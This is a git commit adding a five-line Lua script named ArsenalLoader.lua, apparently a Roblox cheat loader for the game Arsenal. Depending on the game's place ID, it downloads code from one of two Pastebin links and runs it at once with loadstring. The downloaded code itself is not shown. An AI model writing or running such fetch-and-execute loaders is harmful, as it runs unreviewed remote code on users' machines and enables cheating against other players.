58209347f3fce3f7e4e3b5b5bbf2963da18f4e34
nesquickwe <129233887+nesquickwe@users.noreply.github.com>
2025-08-21 19:18:50 -0500

    Create ArsenalLoader.lua

---
+++ ArsenalLoader.lua
@@ -0,0 +1,5 @@
+if game.PlaceId == 17625359962 then
+    loadstring(game:HttpGet("https://pastebin.com/raw/Bk9t6TyC"))()
+else
+    loadstring(game:HttpGet("https://pastebin.com/raw/zvuJjvH5"))()
+end
